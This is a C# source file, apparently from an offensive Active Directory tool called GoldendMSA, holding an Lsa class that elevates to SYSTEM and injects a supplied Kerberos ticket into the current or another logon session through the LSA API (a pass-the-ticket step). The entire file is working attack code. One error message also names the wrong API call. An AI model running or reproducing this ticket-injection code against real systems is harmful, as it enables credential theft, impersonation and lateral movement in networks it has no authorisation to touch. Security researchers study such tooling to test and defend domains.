using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using GoldendMSA.lib;

namespace GoldendMSA
{
    public abstract class Lsa
    {
        private static IntPtr GetLsaHandle(bool elevateToSystem = true)
        {
            IntPtr lsaHandle;

            if (Helpers.IsHighIntegrity() && elevateToSystem && !Helpers.IsSystem())
            {
                if (!Helpers.GetSystem()) throw new Exception("Could not elevate to system");

                Interop.LsaConnectUntrusted(out lsaHandle);
                Interop.RevertToSelf();
            }
            else
            {
                Interop.LsaConnectUntrusted(out lsaHandle);
            }

            return lsaHandle;
        }

        public static void ImportTicket(byte[] ticket, LUID targetLuid)
        {
            var lsaHandle = GetLsaHandle();
            int protocolStatus;

            if (targetLuid != 0)
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine(
                        "[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }

            var inputBuffer = IntPtr.Zero;
            IntPtr protocolReturnBuffer;
            int returnBufferLength;
            try
            {
                Interop.LSA_STRING_IN lsaString;
                var name = "kerberos";
                lsaString.Length = (ushort)name.Length;
                lsaString.MaximumLength = (ushort)(name.Length + 1);
                lsaString.Buffer = name;
                var ntstatus =
                    Interop.LsaLookupAuthenticationPackage(lsaHandle, ref lsaString, out var authenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError,
                        errorMessage);
                    return;
                }

                var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if (targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, authenticationPackage, inputBuffer,
                    inputBufferSize, out protocolReturnBuffer, out returnBufferLength, out protocolStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError,
                        errorMessage);
                    return;
                }

                if (protocolStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)protocolStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}",
                        winError, errorMessage);
                    return;
                }

                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);

                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
        }
    }
}